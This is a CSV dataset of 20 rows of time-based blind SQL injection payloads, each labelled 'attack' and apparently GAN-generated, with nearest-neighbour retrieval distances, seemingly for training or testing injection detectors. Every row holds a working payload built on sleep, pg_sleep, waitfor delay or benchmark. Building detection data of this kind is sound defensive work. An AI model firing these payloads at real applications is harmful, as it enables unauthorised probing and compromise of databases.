id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_000001,attack,time,1   )    )    rlike sleep  (  5  )   and    (    (   8773  =  8773,nearest_attack_euclidean,R000308,3.876513705973116
CTGAN_000002,attack,time,waitfor delay '0:0:5' and    (    (     (  8981  =  8981,nearest_attack_euclidean,R000429,5.9533589380154925
CTGAN_000003,attack,time,1   )    )    or sleep  (  5  )   and    (    (   8285  =  8285,nearest_attack_euclidean,R000185,6.893883447872074
CTGAN_000004,attack,time,1' and 6969  =    (  select 6969 from pg_sleep  (  5   )    ) ,nearest_attack_euclidean,R001046,5.217176009770973
CTGAN_000005,attack,time,"1%""  )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000726,3.4716763931563155
CTGAN_000006,attack,time,select sleep  (  5  )   and    (    (     (  8354  =  8354,nearest_attack_euclidean,R000756,5.9911772271823915
CTGAN_000007,attack,time,"1%""  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and   (  ""%""  =  """,nearest_attack_euclidean,R000235,8.838001785641296
CTGAN_000008,attack,time,"1'  )   or elt  (  6272  =  6272,sleep  (  5   )    )   ",nearest_attack_euclidean,R001001,6.723195045160115
CTGAN_000009,attack,time,waitfor delay '0:0:5' and    (    (     (  8981  =  8981,nearest_attack_euclidean,R000429,7.158148376146279
CTGAN_000010,attack,time,"1""  )   as gjlv where 1983  =  1983 and sleep  (  5  )  #",nearest_attack_euclidean,R000450,7.0107384809155
CTGAN_000011,attack,time,select sleep  (  5  )   and    (    (     (  'rzjf'  =  'rzjf,nearest_attack_euclidean,R000367,6.789242650323965
CTGAN_000012,attack,time,select pg_sleep  (  5  )   and    (    (     (  'xobx'  =  'xobx,nearest_attack_euclidean,R000117,5.408416027971368
CTGAN_000013,attack,time,1   )    )    or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000033,7.508273565982621
CTGAN_000014,attack,time,1'  )   and sleep  (  5  )   and   (  'xecl' like 'xecl,nearest_attack_euclidean,R000495,4.904125671660781
CTGAN_000015,attack,time,1   )    )     )   and sleep  (  5  )   and    (    (     (  6618  =  6618,nearest_attack_euclidean,R000089,4.831642953436649
CTGAN_000016,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  ""poik""  =  ""poik",nearest_attack_euclidean,R000947,4.456116316221299
CTGAN_000017,attack,time,"select sleep  (  5  )   and   (  ""innk""  =  ""innk",nearest_attack_euclidean,R000219,7.011240196574924
CTGAN_000018,attack,time,"1"" and elt  (  1210  =  1210,sleep  (  5   )    )    and ""phcl"" like ""phcl",nearest_attack_euclidean,R001018,6.944937064167007
CTGAN_000019,attack,time,"1""   )    )    rlike sleep  (  5  )   and    (    (   ""ahhx"" like ""ahhx",nearest_attack_euclidean,R000272,6.534106484758836
CTGAN_000020,attack,time,1'  )   where 5540  =  5540 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000997,7.461883116086977
